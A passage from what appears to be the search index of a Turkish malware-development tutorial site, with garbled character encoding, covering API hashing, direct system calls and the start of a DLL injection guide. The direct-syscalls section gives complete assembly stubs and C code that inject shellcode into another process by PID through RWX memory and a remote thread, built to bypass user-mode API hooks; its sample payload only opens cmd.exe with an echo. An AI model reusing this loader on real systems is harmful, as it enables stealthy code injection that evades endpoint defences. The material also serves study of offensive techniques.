(PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA); // Export edilmiÅŸ fonksiyonlarla ilgili bilgiler iÃ§in RVA'larÄ± al PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfFunctions); PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNames); PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNameOrdinals); for (DWORD i = 0; i \u003c imageExportDirectory-\u003eNumberOfFunctions; i++) { DWORD functionNameRVA = addressOfNamesRVA[i]; DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA; char* functionName = (char*)functionNameVA; DWORD_PTR functionAddressRVA = 0; // AlÄ±nan Export fonksiyonun hash deÄŸerini hesapla DWORD functionNameHash = getHashFromString(functionName); // CreateThread bulunursa Adresini ekrana bastÄ±r ve main'e dÃ¶n if (functionNameHash == hash) { functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]]; functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA); printf(\"%s : 0x%x : %p\\n\", functionName, functionNameHash, functionAddress); return functionAddress; } } } int main() { DWORD hash = getHashFromString(\"CreateThread\"); PDWORD functionAddress = getFunctionAddressByHash((char*)\"kernel32\", hash); DWORD TID = 0; HANDLE th = CreateThread(NULL, 0, NULL, NULL, 0, \u0026TID); if (th == NULL) { printf(\"Failed to create thread\\n\"); return -1; } printf(\"Thread created successfully\\n\"); CloseHandle(th); return 0; } Sonuca baktÄ±ÄŸÄ±mÄ±zda ise baÅŸarÄ±lÄ± bir ÅŸekilde APIâ€™in adresinin alÄ±ndÄ±ÄŸÄ±nÄ± ve Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rmekteyiz.\nReferences EN Wikipedia - Portable Executable Tech Zealots - A Comprehensive Guide To PE Structure, The Laymanâ€™s Way Red Team Notes - Windows API Hashing in Malware Cognisys Labs - Combining Indirect Dynamic Syscalls and API Hashing "},"title":"API Hashing"},"/tr/docs/malware-dev/direct-syscalls/":{"data":{"":"","direct-systemcall-ile-shellcode-Ã§alÄ±ÅŸtÄ±rma#\u003cstrong\u003eDirect Systemcall ile Shellcode Ã‡alÄ±ÅŸtÄ±rma\u003c/strong\u003e":"","direct-systemcall-yÃ¶ntemi#\u003cstrong\u003eDirect Systemcall YÃ¶ntemi\u003c/strong\u003e":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Merhabalar bu yazÄ±da Direct System Calls konusuna deÄŸineceÄŸiz.\nSystem Call Nedir? [!WARNING] Okuyucunun NTAPI Injection blogunda anlatÄ±lan NTAPI mekanizmasÄ±, user-mode ve kernel-mode arasÄ±ndaki temel farklar gibi konularda bilgisi olduÄŸu varsayÄ±lmÄ±ÅŸtÄ±r.\nDirekt olarak tekniÄŸe geÃ§meden Ã¶nce syscall nedir bunu anlamamÄ±z gerekiyor.\nBir sistem Ã§aÄŸrÄ±sÄ± (system call), bir programÄ±n iÅŸletim sisteminden bir hizmet talep etmesinin programatik yoludur. Daha basit olarak, kullanÄ±cÄ± modunda (user mode) Ã§alÄ±ÅŸan bir programÄ±n Ã§ekirdek moduna (kernel mode) geÃ§mesini saÄŸlayan bir komuttur. Windows gibi iÅŸletim sistemlerinde, kullanÄ±cÄ± modunda Ã§alÄ±ÅŸan bir program, bir sistem Ã§aÄŸrÄ±sÄ± yaparak iÅŸletim sisteminin Ã§ekirdek modunda Ã§alÄ±ÅŸan servislerine ulaÅŸÄ±r. Bu geÃ§iÅŸ, CPUâ€™nun iÅŸletim sistemi tarafÄ±ndan yÃ¶netilen Ã§ekirdek moduna geÃ§mesiyle gerÃ§ekleÅŸir.\nSÃ¶z konusu Windows API olduÄŸunda, bir user-mode program tarafÄ±ndan Ã§aÄŸÄ±rÄ±lan WIN32 APIâ€™in Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in user-mode alanÄ±ndan kernel-mode alana geÃ§ici geÃ§iÅŸi (geÃ§iÅŸ CPU anahtarÄ±) saÄŸlayan bir komuttur.\nKafanÄ±za daha iyi oturmasÄ± iÃ§in diyagram Ã¼zerinden ilerleyelim:\nNTAPI Injection blogumu okuduysanÄ±z bu diyagram yabancÄ± gelmeyecektir. Fakat yine de Ã¶zet geÃ§mekte fayda var.\nDiyelim ki user-mode programdan OpenProcess APIâ€™i Ã§aÄŸÄ±rdÄ±k. Bu APIâ€™larÄ±n orijinal adresleri kernel alanÄ±ndan ntoskrnl.exeâ€˜de tutulduÄŸu iÃ§in user-mode alanÄ±ndan kernel-modeâ€™a yÃ¶nlendirilmesi gerekiyor. Bu APIâ€™in ilk duraÄŸÄ± kernel32.dll alanÄ±ndan OpenProcess olacaktÄ±r ve sonra user-mode alanÄ±n son duraÄŸÄ± olan ntdll.dll kÃ¼tÃ¼phanesine giderek NtOpenProcess haline dÃ¶nÃ¼ÅŸÃ¼r. Konumuzilgisi olan SYSCALL tam burada devreye giriyor. ntdll.dllâ€™den sonra adÄ±mlar kernel alanÄ±ndan devam edeceÄŸi iÃ§in kernel-mode alana yÃ¶nlendirilmesi gerekiyor.\nSYSCALL Ã§alÄ±ÅŸtÄ±ktan sonra ise kernel-mode alana geÃ§iÅŸ yapÄ±larak SSDT tablosuna yÃ¶nlendirilir NtOpenProcessâ€˜in orijinal adresi hesaplanÄ±r ve ntoskrnl.exeâ€™den adrese yÃ¶nlendirilir. EÄŸer SSDT tablosu hakkÄ±nda bilgi sahibi olmak isterseniz SSDT bloguma gÃ¶z atabilirsiniz.\nFakat yapÄ±lan bu syscallâ€™lar direkt olarak belirsiz bir ÅŸekilde yapÄ±lmÄ±yor. Hangi APIâ€™in Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ± anlaÅŸÄ±lmasÄ± iÃ§in her NTAPI iÃ§in bir syscall numarasÄ± bulunur. Bu numaralar, iÅŸletim sistemi versiyonuna gÃ¶re deÄŸiÅŸiklik gÃ¶sterebilir ve genellikle kernel seviyesinde tanÄ±mlÄ±dÄ±r. BÃ¶ylece programâ€™Ä±n hangi APIâ€™i Ã§alÄ±ÅŸtÄ±rmak istendiÄŸi belirlenmiÅŸ olur.\nMesela Windbg ile ntdll.dllâ€™den NtOpenProcessâ€™in syscall numarasÄ±na gÃ¶z atabiliriz:\nBir syscall yapÄ±ldÄ±ÄŸÄ±nda ssn yani syscall numarasÄ± eaxâ€™a aktarÄ±lÄ±r. FotoÄŸrafta eaxâ€™a aktarÄ±lan deÄŸerin 0x26 olduÄŸunu gÃ¶rebiliriz.\nDirect Systemcall YÃ¶ntemi Direct Systemcall yÃ¶ntemi, adÄ±ndan da anlaÅŸÄ±labileceÄŸi gibi, user-mode programlardan doÄŸrudan syscall yapmayÄ± iÃ§eren bir tekniktir. Bu yÃ¶ntem, arada herhangi bir kÃ¼tÃ¼phaneye (ÅŸemadan gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi kernel32.dll vs.) gitmeden, doÄŸrudan syscall yapÄ±lÄ±r.\nYÄ±llar geÃ§se de sÄ±kÄ±lmayacaÄŸÄ±mÄ±z Ã¶rnek olan NtOpenProcessâ€™i kullanarak bir syscall Ã¶rneÄŸi yapalÄ±m. KafamÄ±za daha iyi oturacaktÄ±r.\nAssembly Projenin KodlanmasÄ± HatÄ±rlarsanÄ±z NTAPI Injection konusunda NtOpenProcess Ã§alÄ±ÅŸtÄ±rmak iÃ§in yapÄ±sÄ±nÄ± tanÄ±mlÄ±yorduk. Bu yÃ¶ntemle beraber projede bir .asm dosyasÄ± oluÅŸturacaÄŸÄ±z. Bunun nedeni ise yapÄ±lan syscallâ€™lar assembly yani daha dÃ¼ÅŸÃ¼k seviyede yapÄ±lÄ±r. Bu yÃ¼zden direkt olarak C kodlarÄ±yla syscall yapamayÄ±z.\nVisual Studioâ€™da oluÅŸturduÄŸumuz projeye saÄŸ tÄ±klayalÄ±m ve Build Dependencies \u003e Build Customizationsâ€˜a tÄ±klayalÄ±m:\nAÃ§Ä±lan ekrandan masm kutucuÄŸunu iÅŸaretleyelim:\nDaha sonra bir .asm projesi oluÅŸturalÄ±m ve oluÅŸturulan projeye saÄŸ tÄ±klayÄ±p Properties seÃ§eneÄŸine tÄ±klayalÄ±m:\nPropertiesâ€™e tÄ±kladÄ±ktan sonra Excluded From Build seÃ§eneÄŸini No olarak iÅŸaretleyelim.\nDaha sonra oluÅŸturduÄŸumuz assembly dosyasÄ±nÄ± kodlayalÄ±m:\n.code My_NtOpenProcess proc mov r10,rcx mov eax,26h syscall ret My_NtOpenProcess endp end Bu kodda gÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi 0x26 ssn ile syscall yapÄ±yoruz. C projemizde My_NtOpenProcess fonksiyonunu Ã§aÄŸÄ±rdÄ±ÄŸÄ±mÄ±zda akÄ±ÅŸ buraya aktarÄ±lacak.\nC Projenin KodlanmasÄ± Åimdi ise main.h adÄ±nda bir header dosyasÄ± oluÅŸturalÄ±m ve aÅŸaÄŸÄ±daki kodlarÄ± yapÄ±ÅŸtÄ±rÄ±n:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define STATUS_SUCCESS (NTSTATUS)0x00000000L typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; extern NTSTATUS My_NtOpenProcess( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId ); ArtÄ±k bu yapÄ±larÄ±n ne iÃ§in kullanÄ±ldÄ±ÄŸÄ±nÄ± biliyoruz. extern ile assembly projesinde oluÅŸturduÄŸumuz My_NtOpenProcessâ€˜i tanÄ±mladÄ±ÄŸÄ±mÄ±za dikkat edin.\nArtÄ±k main.c projesini kodlayabiliriz:\n#include \"main.h\" int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program \u003cPID\u003e\\n\"); return 1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; CLIENT_ID CID = { (HANDLE)PID, NULL }; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; NTSTATUS Status = My_NtOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"NtOpenProcess failed with status: 0x%08x\\n\", Status); return -1; } printf(\"HandleProcess: 0x%p\\n\", HandleProcess); return 0; } NTAPI Injection konusundan sonra kodlar artÄ±k bize yabancÄ± gelmeyecektir. ProgramÄ± Ã§alÄ±ÅŸtÄ±ralÄ±m ve sonuÃ§lara gÃ¶z atalÄ±m:\nGÃ¶rÃ¼ndÃ¼ÄŸÃ¼ gibi baÅŸarÄ±lÄ± bir ÅŸekilde NtOpenProcess Ã§alÄ±ÅŸÄ±yor. Yine de arka planda neler olduÄŸunu daha yakÄ±ndan gÃ¶rmek iÃ§in Windbg kullanabiliriz:\nmain fonksiyondan My_NtOpenProcessâ€™i Ã§aÄŸÄ±rdÄ±ÄŸÄ±mÄ±z kÄ±sma bir bp koyalÄ±m ve adÄ±m adÄ±m neler yaptÄ±ÄŸÄ±na bir gÃ¶z atalÄ±m:\nGÃ¶rÃ¼ndÃ¼ÄŸÃ¼ gibi Assembly projesinde oluÅŸturduÄŸumuz fonksiyona yÃ¶neliyor ve artÄ±k bu kÄ±sÄ±mdan sonra akÄ±ÅŸ kernelâ€™a yÃ¶nelecek.\nYaptÄ±ÄŸÄ±mÄ±z adÄ±mÄ±n diyagramÄ±nÄ± oluÅŸturabiliriz bÃ¶ylece daha iyi anlayabiliriz:\nDirect Systemcall ile Shellcode Ã‡alÄ±ÅŸtÄ±rma Ã–ncelikle oluÅŸturduÄŸumuz Assembly projesini aÅŸaÄŸÄ±daki kod ile gÃ¼ncelleyelim:\n.data extern NtOpenProcessSSN:DWORD extern NtAllocateVirtualMemorySSN:DWORD extern NtWriteVirtualMemorySSN:DWORD extern NtCreateThreadExSSN:DWORD extern NtWaitForSingleObjectSSN:DWORD extern NtCloseSSN:DWORD .code My_NtOpenProcess PROC mov r10, rcx mov eax, NtOpenProcessSSN syscall ret My_NtOpenProcess ENDP My_NtAllocateVirtualMemory PROC mov r10, rcx mov eax, NtAllocateVirtualMemorySSN syscall ret My_NtAllocateVirtualMemory ENDP My_NtWriteVirtualMemory PROC mov r10, rcx mov eax, NtWriteVirtualMemorySSN syscall ret My_NtWriteVirtualMemory ENDP My_NtCreateThreadEx PROC mov r10, rcx mov eax, NtCreateThreadExSSN syscall ret My_NtCreateThreadEx ENDP My_NtWaitForSingleObject PROC mov r10, rcx mov eax, NtWaitForSingleObjectSSN syscall ret My_NtWaitForSingleObject ENDP END Daha sonra main.h header dosyasÄ±nÄ± gÃ¼ncelleyelim:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define STATUS_SUCCESS (NTSTATUS)0x00000000L DWORD NtOpenProcessSSN; DWORD NtAllocateVirtualMemorySSN; DWORD NtWriteVirtualMemorySSN; DWORD NtCreateThreadExSSN; DWORD NtWaitForSingleObjectSSN; DWORD NtCloseSSN; #pragma region STRUCTURES typedef struct _PS_ATTRIBUTE { ULONG Attribute; SIZE_T Size; union { ULONG Value; PVOID ValuePtr; } u1; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; #pragma endregion extern NTSTATUS My_NtOpenProcess( OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId OPTIONAL ); extern NTSTATUS My_NtAllocateVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect ); extern NTSTATUS My_NtWriteVirtualMemory( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL ); extern NTSTATUS My_NtCreateThreadEx( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL ); extern NTSTATUS My_NtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_opt_ PLARGE_INTEGER Timeout ); Son olarak ise main.c projemizi gÃ¼ncelleyelim:\n#include \"main.h\" char Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x44\\x69\\x72\\x65\\x63\\x74\\x20\\x53\\x79\\x73\" \"\\x74\\x65\\x6d\\x63\\x61\\x6c\\x6c\\x73\\x20\\x77\\x69\\x74\\x68\\x20\" \"\\x62\\x65\\x6b\\x6f\\x6f\\x22\"; size_t ShellcodeSize = sizeof(Shellcode); DWORD GetSSN(HMODULE ModuleName, LPCSTR ProcName) { printf(\"\\n***** %s *****\\n\", ProcName); DWORD sysCallNumber = 0; UINT_PTR targetNtFunction; targetNtFunction = (UINT_PTR)GetProcAddress(ModuleName, ProcName); if (targetNtFunction == 0) { printf(\"%s handle retrieval failed Error Code: 0x%lx\\n\", ProcName, GetLastError()); return -1; } sysCallNumber = ((PBYTE)(targetNtFunction + 0x4))[0]; printf(\"SSN number for the %s successfully received! 0x%lx\\n\", ProcName, sysCallNumber); return sysCallNumber; } int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program \u003cPID\u003e\\n\"); return 1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; PVOID RemoteBuffer = NULL; HMODULE NTDLLAddress = GetModuleHandleW(L\"ntdll.dll\"); CLIENT_ID CID = { (HANDLE)PID, NULL }; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; NTSTATUS Status = STATUS_SUCCESS; NtOpenProcessSSN = GetSSN(NTDLLAddress, \"NtOpenProcess\"); Status = My_NtOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"NtOpenProcess failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } NtAllocateVirtualMemorySSN = GetSSN(NTDLLAddress, \"NtAllocateVirtualMemory\"); Status = My_NtAllocateVirtualMemory(HandleProcess, \u0026RemoteBuffer, 0, \u0026ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (Status != STATUS_SUCCESS) { printf(\"NtAllocateVirtualMemory failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } NtWriteVirtualMemorySSN = GetSSN(NTDLLAddress, \"NtWriteVirtualMemory\"); Status = My_NtWriteVirtualMemory(HandleProcess, RemoteBuffer, Shellcode, ShellcodeSize, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtWriteVirtualMemory failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } NtCreateThreadExSSN = GetSSN(NTDLLAddress, \"NtCreateThreadEx\"); Status = My_NtCreateThreadEx(\u0026HandleThread, THREAD_ALL_ACCESS, NULL, HandleProcess, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, FALSE, 0, 0, 0, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtCreateThreadEx failed! Error Code: 0x%lx\\n\", Status); return 1; } NtWaitForSingleObjectSSN = GetSSN(NTDLLAddress, \"NtWaitForSingleObject\"); Status = My_NtWaitForSingleObject(HandleThread, FALSE, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtWaitForSingleObject failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 1; } printf(\"Shellcode executed successfully\\n\"); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } KodlarÄ±n neler yaptÄ±ÄŸÄ±nÄ± bildiÄŸimiz iÃ§in anlatmama gerek yok direkt olarak sonucu gÃ¶relim:\nSonuÃ§ Bu konuda user mode programdan direkt olarak nasÄ±l syscall yapÄ±lÄ±r bunu gÃ¶rdÃ¼k.\nUmarÄ±m konu sizin iÃ§in faydalÄ± olmuÅŸtur. DiÄŸer blogta gÃ¶rÃ¼ÅŸmek Ã¼zere.\nReferences Wikipedia - System Call\nREDOPS - Direct Syscalls: A journey from high to low","sonuÃ§#\u003cstrong\u003eSonuÃ§\u003c/strong\u003e":"","system-call-nedir#\u003cstrong\u003eSystem Call Nedir?\u003c/strong\u003e":""},"title":"Direct Syscalls"},"/tr/docs/malware-dev/dll-injection/":{"data":{"":"","dll-injection#\u003cstrong\u003eDLL Injection\u003c/strong\u003e":"","dll-kodlama#DLL kodlama":"","dll-nedir#\u003cstrong\u003eDLL Nedir?\u003c/strong\u003e":"","kod#Kod":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Merhabalar. Bu blogta DLL Injection tekniÄŸini inceleyeceÄŸiz.\nDLL Nedir? DLL (Dynamic Link Library), aynÄ± anda birden fazla program tarafÄ±ndan kullanÄ±lan kod ve veri iÃ§eren kÃ¼tÃ¼phanelerdir. Windows iÅŸletim sisteminde bir program Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ±zda veya Windows iÅŸletim sistemi bir iÅŸlevi yerine getirmek istediÄŸi zaman DLLâ€™leri ÅŸeyi kullanÄ±r.\nBu kÃ¼tÃ¼phaneler, genellikle yukarÄ±da bahsettiÄŸim gibi birden fazla uygulamada ortak olan kodlarÄ±, iÅŸlevleri veya kaynaklarÄ± iÃ§erir. Bu, kod tekrarÄ±nÄ± azaltÄ±r ve uygulama boyutlarÄ±nÄ± kÃ¼Ã§Ã¼ltÃ¼r. DLLâ€™ler, yalnÄ±zca gerektiÄŸinde belleÄŸe yÃ¼klenir ve bu da sistem kaynaklarÄ±nÄ±n verimli kullanÄ±lmasÄ±nÄ± saÄŸlar.\nArtÄ±k teorik olarak DLLâ€˜in ne olduÄŸunu biliyoruz ama bu teknikte ne yapÄ±yoruz? Bir de buna bakalÄ±m.\nDLL kodlama Bu konuda sadece â€œDLL budurâ€ diyerek konuyu teorik olarak bÄ±rakmak istemiyorum. DLLâ€™in ne olduÄŸu kafamÄ±zda daha netleÅŸmesi aÃ§Ä±sÄ±ndan Visual Studio ortamÄ±nda DLL projesi oluÅŸturacaÄŸÄ±z ve basitÃ§e kodlamasÄ±nÄ± yapacaÄŸÄ±z. ArdÄ±ndan ise DLL Injection yÃ¶ntemi ile hazÄ±rladÄ±ÄŸÄ±mÄ±z DLLâ€™i enjekte edeceÄŸiz. â€œDLL iÃ§in kodlamayÄ± nasÄ±l yapacaÄŸÄ±z?â€ gibi sorularla kafanÄ±zda bir ÅŸÃ¼phe oluÅŸmasÄ±n. DLLâ€™ler C/C++ dilleriyle kodlanÄ±yor, dolayasÄ±yla geliÅŸtirmemiz zor olmayacak.\nVisual Studio aÃ§alÄ±m ve Create a new Projectâ€™e tÄ±klayalÄ±m ve arama yerine â€˜Dynamicâ€™ diye aratalÄ±m:\nArdÄ±ndan bunu seÃ§elim ve projemize isim vererek projeyi oluÅŸturalÄ±m. Proje oluÅŸturulduktan sonra aÅŸaÄŸÄ±daki kodlar bizi karÅŸÄ±lÄ±yor olacak:\nDLLâ€™lerin main alanÄ± DllMainâ€™dir. TÄ±pkÄ± C projelerimizde nasÄ±l main fonksiyonuna kod yazÄ±yorsak, DLL projelerinde de baÅŸlangÄ±Ã§ noktasÄ± burasÄ±dÄ±r. Ancak burada bir fark var: DllMain fonksiyonu, birkaÃ§ Ã¶zel parametre alÄ±r ve bu parametreler DLLâ€™in yaÅŸam dÃ¶ngÃ¼sÃ¼nÃ¼ yÃ¶netmek iÃ§in kullanÄ±lÄ±r.\nDllMainâ€™in parametreleri:\nhModule: Bu parametre, DLLâ€™nin yÃ¼klendiÄŸi modÃ¼lÃ¼n bir tanÄ±tÄ±cÄ±sÄ±dÄ±r (handle). Bu, genellikle DLLâ€™nin bellek adresine iÅŸaret eder ve iÅŸlem boyunca benzersizdir. ul_reason_for_call: Bu, DLLâ€™nin hangi sebeple Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nÄ± belirtir. Ã–zellikle bunu aklÄ±nÄ±zda tutun Ã§Ã¼nkÃ¼ birazdan aÅŸaÄŸÄ±da daha detaylÄ± ele alacaÄŸÄ±m. lpReserved: YÃ¼kleme ve boÅŸaltma sÄ±rasÄ±nda ek bilgi taÅŸÄ±mak iÃ§in kullanÄ±lÄ±r. Bu parametre genellikle nadiren kullanÄ±lÄ±r. DLLMain iÃ§erisindeki switch-case yapÄ±sÄ±, ul_reason_for_call parametresine gÃ¶re Ã§alÄ±ÅŸÄ±r. Bu parametre, DLLâ€™in hangi durumda olduÄŸunu belirtir. Burada dÃ¶rt farklÄ± durum vardÄ±r ve bunlarÄ± sÄ±rayla inceleyelim:\nDLL_PROCESS_ATTACH: Bu, DLLâ€™nin bir iÅŸlem tarafÄ±ndan ilk kez yÃ¼klendiÄŸi anlamÄ±na gelir. Yani program Ã§alÄ±ÅŸÄ±rken DLLâ€™yi kullanmaya baÅŸladÄ±ÄŸÄ±nda buraya geliriz. DLL_THREAD_ATTACH: EÄŸer programÄ±nÄ±z iÃ§inde yeni bir thread oluÅŸturulursa, bu durum devreye girer. Ã–rneÄŸin, threadâ€™e Ã¶zel veriler veya ayarlar yapmak isterseniz bu durumda kod yazabilirsiniz. DLL_THREAD_DETACH: Bu, bir iÅŸ parÃ§acÄ±ÄŸÄ± sona erdiÄŸinde Ã§aÄŸrÄ±lÄ±r. Ä°ÅŸ parÃ§acÄ±ÄŸÄ±yla iliÅŸkili Ã¶zel kaynaklarÄ± serbest bÄ±rakmak veya temizlik iÅŸlemleri yapmak iÃ§in burayÄ± kullanabilirsiniz. DLL_PROCESS_DETACH: DLL artÄ±k kullanÄ±lmadÄ±ÄŸÄ±nda veya program kapatÄ±ldÄ±ÄŸÄ±nda bu durum gerÃ§ekleÅŸir. Yani program kapanmadan Ã¶nce ne gerekiyorsa bu kÄ±sÄ±mda yapÄ±lÄ±r. Son olarak, TRUE dÃ¶ndÃ¼rmek DLLâ€™in baÅŸarÄ±yla yÃ¼klendiÄŸini veya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± belirtir. EÄŸer bir sorun oluÅŸtuysa, FALSE dÃ¶ndÃ¼rebiliriz. Ancak TRUE genellikle varsayÄ±lan seÃ§enektir.\nBizim kodlama iÃ§in ilgileneceÄŸimiz durum, DLL_PROCESS_ATTACH olacaktÄ±r. Åimdi burada basit bir kodlama yapalÄ±m:\nTekrarlamaktan zarar gelmez, DLL_PROCESS_ATTACH alanÄ±nda kodladÄ±ÄŸÄ±ma dikkat edin. Burada basitÃ§e MessageBoxA kullanarak bir â€œBen zararsiz bir dllimâ€ mesajÄ±nÄ± ekrana bastÄ±rÄ±yoruz (mesajÄ± yazarken ben bile zararsÄ±z olduÄŸuna inandÄ±m). Hedef process bu DLL yÃ¼klediÄŸi zaman bu kod Ã§alÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ olacak.\nSolution Explorerâ€˜da projemize saÄŸ tÄ±klayÄ±p Rebuild seÃ§eceÄŸine tÄ±klayalÄ±m ve /x64/Debug dizininden oluÅŸturulan .dllâ€™e gÃ¶z atalÄ±m:\nGÃ¶rÃ¼ndÃ¼ÄŸÃ¼ gibi bir .dll ve .pdb dosyalarÄ± elde ediyoruz. Bu .dll dosyasÄ±nÄ± eriÅŸebileceÄŸiniz baÅŸka bir yere kaydedebilirsiniz. TekniÄŸi kullanÄ±rken .dll dosyanÄ±n tam 